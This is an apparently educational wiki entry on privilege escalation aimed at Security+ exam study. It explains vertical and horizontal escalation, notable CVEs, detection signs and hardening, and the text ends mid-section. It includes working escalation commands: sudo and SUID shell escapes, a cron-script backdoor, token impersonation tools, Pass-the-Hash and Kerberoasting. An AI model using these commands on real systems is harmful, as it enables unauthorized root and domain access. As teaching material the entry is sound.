---
domain: "attack-techniques"
tags: [privilege-escalation, post-exploitation, lateral-movement, access-control, vulnerability-exploitation, red-team]
---
# Privilege Escalation

**Privilege escalation** is the act of exploiting a bug, design flaw, or misconfiguration in an operating system or application to gain **elevated access to resources** that are normally protected from a standard user. It is a critical phase of the [[kill chain]] and [[MITRE ATT&CK]] framework, typically occurring after initial [[foothold]] establishment. Privilege escalation can be **vertical** (gaining higher-level permissions, e.g., user → root/SYSTEM) or **horizontal** (accessing another account at the same privilege level).

---

## Overview

Privilege escalation exists because modern operating systems implement **discretionary and mandatory access control models** that separate user-space processes from kernel-space operations. Attackers who gain initial access to a system often do so with limited privileges—perhaps as a web server process, a low-privilege shell, or a guest account. To achieve their objectives (data exfiltration, persistence, lateral movement), they must elevate those privileges to gain control over the broader system.

The root causes of privilege escalation vulnerabilities are varied. They include **kernel vulnerabilities** in the operating system itself, **SUID/SGID misconfigurations** on Linux, **unquoted service paths** and **weak service permissions** on Windows, misconfigured **sudoers files**, insecure **cron jobs**, exposed **credentials in configuration files or environment variables**, and **DLL hijacking** on Windows systems. Each of these represents a gap between the intended security model and the actual implementation.

Privilege escalation is not exclusively a technical exploit. **Social engineering**, **token impersonation**, **Pass-the-Hash**, and **abuse of legitimate administrative tools** (such as PsExec, WMI, or PowerShell remoting) all constitute escalation techniques when used to gain access beyond what is legitimately granted. This blurs the line between escalation and lateral movement, which is why frameworks like MITRE ATT&CK treat them as related but distinct tactics (TA0004 for Privilege Escalation, TA0008 for Lateral Movement).

Real-world incidents consistently demonstrate the catastrophic impact of successful privilege escalation. The 2020 **SolarWinds supply chain attack** involved escalating from compromised service accounts to Domain Admin within victim environments. The **EternalBlue**-based WannaCry and NotPetya attacks used SMB vulnerabilities that effectively gave attackers SYSTEM-level execution. In enterprise environments, misconfigurations like **Kerberoasting** and **AS-REP Roasting** allow attackers to escalate from any authenticated domain user to highly privileged service accounts without triggering traditional alerts.

Privilege escalation is categorized under **MITRE ATT&CK Tactic TA0004**, with dozens of associated techniques including Abuse Elevation Control Mechanisms (T1548), Access Token Manipulation (T1134), Exploitation for Privilege Escalation (T1068), and Process Injection (T1055). Understanding these categories provides a structured lens for both offensive assessment and defensive hardening.

---

## How It Works

### Phase 1: Enumeration

Before exploiting anything, an attacker enumerates the target system to identify potential escalation vectors. This is the most important step—automated tools and manual inspection both play a role.

**Linux Enumeration:**
```bash
# Current user and groups
id && whoami

# Sudo privileges — check for NOPASSWD entries
sudo -l

# SUID/SGID binaries (run as owner regardless of who executes them)
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID

# World-writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs (can be hijacked if writable scripts are called)
cat /etc/crontab
ls -la /etc/cron.*

# Running processes and services
ps aux
systemctl list-units --type=service

# Kernel version (for kernel exploits)
uname -a
cat /proc/version

# Readable /etc/passwd and /etc/shadow
cat /etc/passwd
cat /etc/shadow   # requires root; if readable, password cracking is possible

# Environment variables and PATH hijacking opportunities
env
echo $PATH

# Capabilities assigned to binaries
getcap -r / 2>/dev/null
```

**Windows Enumeration:**
```powershell
# Current user privileges
whoami /all

# Local users and groups
net user
net localgroup administrators

# Running services and their binary paths
sc query
Get-Service | Where-Object {$_.Status -eq "Running"}

# Unquoted service paths (classic escalation vector)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Scheduled tasks
schtasks /query /fo LIST /v

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated (if set, MSI packages run as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
```

---

### Phase 2: Common Linux Escalation Techniques

**Sudo Misconfiguration:**
```bash
# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
# This spawns a root shell because vim runs with sudo
```

**SUID Binary Abuse via GTFOBins:**
```bash
# If /usr/bin/find has SUID bit set
find . -exec /bin/sh -p \; -quit
# The -p flag preserves effective UID (root)
```

**Writable Cron Script:**
```bash
# If /etc/cron.d/cleanup runs /opt/scripts/clean.sh as root and clean.sh is world-writable:
echo "chmod +s /bin/bash" >> /opt/scripts/clean.sh
# Wait for cron to execute, then:
bash -p   # Spawns root shell
```

**Linux Kernel Exploit (DirtyCow — CVE-2016-5195):**
```bash
# Affected kernels: 2.x through 4.8.3
# Exploits race condition in copy-on-write memory subsystem
# Allows unprivileged user to write to read-only memory mappings
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <new_root_password>
```

---

### Phase 3: Common Windows Escalation Techniques

**Unquoted Service Path:**
```
# If service binary path is: C:\Program Files\My App\service.exe
# Without quotes, Windows searches:
# C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My App\service.exe
# Place malicious binary at C:\Program.exe and restart the service
```

**Token Impersonation (Juicy Potato / Rotten Potato):**
```powershell
# If SeImpersonatePrivilege is enabled (common for service accounts)
# Use JuicyPotato or PrintSpoofer to escalate to SYSTEM
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
.\PrintSpoofer.exe -i -c cmd
```

**Pass-the-Hash:**
```bash
# Using impacket's psexec with NTLM hash (no plaintext password needed)
python3 psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
```

---

### Phase 4: Active Directory Escalation

**Kerberoasting (T1558.003):**
```bash
# Request TGS tickets for service accounts, crack offline
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.1 -request
hashcat -m 13100 hashes.txt rockyou.txt
```

**AS-REP Roasting (T1558.004):**
```bash
# For accounts with "Do not require Kerberos preauthentication" set
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.1
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## Key Concepts

- **Vertical Privilege Escalation**: Gaining a *higher* privilege level than currently held—most commonly a standard user achieving root (Linux) or SYSTEM/Administrator (Windows). This is the most dangerous form as it grants full system control.
- **Horizontal Privilege Escalation**: Accessing *another account at the same privilege level*, such as one user reading another user's files or sessions. Often leveraged to pivot toward accounts with higher privileges or access to sensitive data.
- **SUID/SGID Bit**: A Unix permission flag that causes a binary to execute with the *file owner's* privileges rather than the executing user's. If set on a binary owned by root and the binary is exploitable or abusable (e.g., via GTFOBins), it becomes a direct escalation path.
- **Token Impersonation**: A Windows technique where an attacker with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` forces a high-privileged process to authenticate and then "impersonates" that token to execute code in a higher-privileged context—commonly used to escalate from IIS/SQL Server service accounts to SYSTEM.
- **Sudoers Misconfiguration**: Errors in `/etc/sudoers` that permit a user to run specific (or all) commands as root, often with `NOPASSWD`. Even seemingly harmless commands like `vim`, `awk`, `python`, or `find` can be abused to spawn shells when run via sudo.
- **DLL Hijacking**: A Windows technique exploiting the DLL search order—placing a malicious DLL in a directory that is searched *before* the legitimate DLL location. When a privileged process loads the DLL, the attacker's code runs with elevated privileges.
- **AlwaysInstallElevated**: A Windows policy that, when enabled in both HKLM and HKCU registry hives, allows any user to install MSI packages with SYSTEM privileges—a trivially exploited misconfiguration.
- **Linux Capabilities**: A fine-grained privilege system that assigns specific kernel capabilities (e.g., `cap_net_bind_service`, `cap_setuid`) to binaries or processes. Misconfigured capabilities (e.g., `cap_setuid+ep` on Python) can be as dangerous as full SUID.

---

## Exam Relevance

**SY0-701 Exam Tips:**

The Security+ exam tests privilege escalation primarily within the context of **threat actors, attack techniques, and vulnerability management**. Key areas to focus on:

- **Know the difference between vertical and horizontal escalation.** A common question pattern presents a scenario (e.g., "an attacker gains access to a user account and then reads files belonging to another user at the same level") and asks which type of escalation occurred. Answer: **horizontal**.
- **Privilege escalation appears under Domain 2.0 (Threats, Vulnerabilities, and Mitigations)** and Domain 4.0 (Security Operations). Expect scenario-based questions about what an attacker would do *after* gaining a foothold.
- **Kerberoasting and Pass-the-Hash** are commonly tested as attack techniques against **Active Directory** environments. Know that Kerberoasting requires a valid domain user (no special privileges), while Pass-the-Hash requires obtaining NTLM hashes from memory (e.g., via Mimikatz).
- **Least Privilege** is the primary defensive concept tested against escalation. Questions will often ask which control *best* prevents privilege escalation—the answer is almost always **least privilege** combined with **proper access control**.
- **Common gotcha**: The exam may describe **sudo abuse** or **misconfigured file permissions** and ask you to identify the vulnerability class. These fall under **misconfiguration** or **improper access control**, not necessarily a software vulnerability (CVE).
- Know that **UAC (User Account Control)** on Windows is a *mitigation* against privilege escalation but is **not a security boundary**—it can be bypassed and should not be treated as a primary defense.
- **MITRE ATT&CK TA0004** is specifically Privilege Escalation—being familiar with the tactic number and key techniques (T1068, T1134, T1548) adds context to scenario questions.

---

## Security Implications

### Vulnerabilities and Attack Vectors

**CVE-2016-5195 (DirtyCow):** A race condition in the Linux kernel's copy-on-write implementation allowed any local user to write to read-only memory mappings, enabling root escalation on kernels 2.x–4.8.3. Widely exploited in the wild before patching.

**CVE-2021-3156 (Baron Samedit / sudo heap overflow):** A heap-based buffer overflow in `sudo` affecting versions 1.8.2–1.8.31p2 and 1.9.0–1.9.5p1. Any local user (including `nobody`) could obtain root by exploiting sudoedit argument parsing. Affected millions of Linux/Unix systems including Debian, Ubuntu, Fedora, and macOS.

**CVE-2020-0796 (SMBGhost):** A buffer overflow in the Windows SMBv3 compression handling that allowed a local attacker (or remote with guest access) to escalate to SYSTEM-level code execution. Demonstrated by security researchers as a reliable local privilege escalation before remote exploitation was confirmed.

**CVE-2022-0847 (Dirty Pipe):** A flaw in the Linux kernel's pipe mechanism (kernels 5.8+) allowing unprivileged users to overwrite data in arbitrary read-only files, including `/etc/passwd`, enabling trivial root escalation. Disclosed by Felix Wilhelm in 2022.

**Active Directory Misconfiguration (No CVE):** Kerberoasting, AS-REP Roasting, and DCSync attacks are not software vulnerabilities but **protocol-level design weaknesses** combined with misconfigurations. Organizations running Active Directory without service account password complexity policies, without monitoring for anomalous Kerberos ticket requests, and with excessive account privileges are routinely compromised.

### Detection Indicators

- Anomalous process spawning (e.g., a web server process spawning `/bin/bash`)
- SUID binary execution by non-root users
- Unexpected `sudo` usage or `su` calls
- Abnormal Kerberos ticket requests (large volume, unusual service names)
- LSASS memory access (Mimikatz indicator on Windows)
- New user accounts added to privileged groups
- Registry modifications to `Run` keys or service binary paths

---

## Defensive Measures

### Linux Hardening

```bash
# Audit SUID/SGID binaries and remove unnecessary bits
chmod u-s /path/to/binary
chmod g-s /path/to/binary

# Restrict sudoers — use specific commands, avoid NOPASSWD
# /etc/sudoers (edited via visudo):
# GOOD:
alice ALL=(root) /usr/bin/systemctl restart nginx
# BAD:
alice ALL=(ALL) NOPASSWD: ALL

# Use noexec mount option on /tmp and /home
# /etc/fstab:
tmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0

# Enable and configure auditd for privilege monitoring
apt install auditd
auditctl -w /etc/sudoers -p wa -k sudoers_changes
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_commands

# Restrict kernel capabilities with AppArmor or SELinux
systemctl enable apparmor
aa-enforce /etc/apparmor.d/*
```

### Windows Hardening

```pow